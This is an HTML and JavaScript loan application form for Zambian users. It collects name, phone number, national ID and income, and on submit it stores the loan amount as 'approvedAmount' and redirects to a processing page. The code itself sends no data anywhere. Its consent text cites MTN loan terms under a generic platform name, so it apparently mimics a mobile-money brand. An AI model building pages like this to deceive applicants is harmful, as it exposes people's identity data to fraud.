<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Loan Application - Community Lending Platform</title>
  <style>
    :root {
      --bg-main: #0c332b;
      --card-bg: #13463b;
      --card-border: #1d5c4f;
      --text-white: #ffffff;
      --text-muted: #a3e635;
      --text-sub: #94a3b8;
      --accent-gold: #f59e0b;
      --accent-green: #22c55e;
      --input-bg: #092620;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg-main);
      color: var(--text-white);
      line-height: 1.5;
    }

    .container {
      max-width: 600px;
      margin: 0 auto;
      padding: 2rem 1rem;
    }

    .form-card {
      background-color: var(--card-bg);
      border-radius: 16px;
      border: 1px solid var(--card-border);
      padding: 2rem 1.5rem;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
    }

    .form-header {
      text-align: center;
      margin-bottom: 2rem;
    }

    .form-header h1 {
      font-size: 1.8rem;
      font-weight: 800;
      color: var(--text-white);
      margin-bottom: 0.5rem;
    }

    .form-header p {
      font-size: 0.875rem;
      color: #cbd5e1;
    }

    .form-group {
      margin-bottom: 1.25rem;
    }

    label {
      display: block;
      font-size: 0.875rem;
      font-weight: 600;
      color: var(--text-sub);
      margin-bottom: 0.5rem;
    }

    input[type="text"],
    input[type="number"],
    input[type="tel"],
    select {
      width: 100%;
      padding: 0.875rem 1rem;
      background-color: var(--input-bg);
      border: 1px solid var(--card-border);
      border-radius: 8px;
      color: var(--text-white);
      font-size: 1rem;
      outline: none;
      transition: border-color 0.2s ease;
    }

    input:focus, select:focus {
      border-color: var(--accent-green);
    }

    select option {
      background-color: var(--input-bg);
      color: var(--text-white);
    }

    .checkbox-group {
      display: flex;
      align-items: flex-start;
      gap: 0.75rem;
      margin: 1.5rem 0;
    }

    .checkbox-group input[type="checkbox"] {
      width: 18px;
      height: 18px;
      margin-top: 3px;
      accent-color: var(--accent-green);
      cursor: pointer;
    }

    .checkbox-group label {
      font-size: 0.85rem;
      color: #cbd5e1;
      font-weight: 400;
      cursor: pointer;
      line-height: 1.4;
    }

    .btn-submit {
      width: 100%;
      background-color: var(--accent-gold);
      color: #000000;
      border: none;
      padding: 1rem;
      font-size: 1.1rem;
      font-weight: 800;
      border-radius: 25px;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      transition: opacity 0.2s ease;
    }

    .btn-submit:hover {
      opacity: 0.9;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="form-card">
      <div class="form-header">
        <h1>Loan Application</h1>
        <p>Please fill in all required details accurately. All information is kept confidential and used only for loan processing and verification.</p>
      </div>

      <form id="loanForm" onsubmit="handleSubmit(event)">
        
        <div class="form-group">
          <label for="fullName">Full Name</label>
          <input type="text" id="fullName" name="fullName" placeholder="John Doe" required />
        </div>

        <div class="form-group">
          <label for="phoneNumber">Phone Number</label>
          <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="09XXXXXXXX" required />
        </div>

        <div class="form-group">
          <label for="nationalId">National ID</label>
          <input type="text" id="nationalId" name="nationalId" placeholder="Enter your ID number" required />
        </div>

        <div class="form-group">
          <label for="loanAmount">Loan Amount (<span class="currencyLabel">ZMW</span>)</label>
          <input type="text" id="loanAmount" name="loanAmount" placeholder="10,000" required />
        </div>

        <div class="form-group">
          <label for="employmentStatus">Employment Status</label>
          <select id="employmentStatus" name="employmentStatus" required>
            <option value="Self-Employed">Self-Employed</option>
            <option value="Employed">Employed</option>
            <option value="Business Owner">Business Owner</option>
            <option value="Unemployed">Unemployed</option>
          </select>
        </div>

        <div class="form-group">
          <label for="monthlyIncome">Monthly Net Income (<span class="currencyLabel">ZMW</span>)</label>
          <input type="text" id="monthlyIncome" name="monthlyIncome" placeholder="0.00" required />
        </div>

        <div class="form-group">
          <label for="repayment">Repayment Period</label>
          <select id="repayment" name="repayment" required>
            <option value="6">6 months</option>
            <option value="12">12 months</option>
            <option value="24">24 months</option>
          </select>
        </div>

        <div class="checkbox-group">
          <input type="checkbox" id="terms" required />
          <label for="terms">
            I confirm that the information provided is true and I agree to the MTN advance Loan terms and conditions.
          </label>
        </div>

        <button type="submit" class="btn-submit">Submit Application</button>
      </form>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const urlParams = new URLSearchParams(window.location.search);
      
      const currency = urlParams.get('currency') || 'ZMW';
      const amount = urlParams.get('loanAmount');
      const term = urlParams.get('termMonths');

      document.querySelectorAll('.currencyLabel').forEach(el => el.innerText = currency);

      if (amount) {
        document.getElementById('loanAmount').value = `${currency} ${parseFloat(amount).toLocaleString()}`;
      }

      if (term) {
        document.getElementById('repayment').value = term;
      }
    });

    function handleSubmit(event) {
      event.preventDefault();
      
      const loanAmount = document.getElementById('loanAmount').value;
      const currency = document.querySelector('.currencyLabel').innerText || 'ZMW';
      
      localStorage.setItem('approvedAmount', loanAmount);
      localStorage.setItem('approvedCurrency', currency);

      window.location.href = "processing.html";
    }
  </script>

</body>
</html>
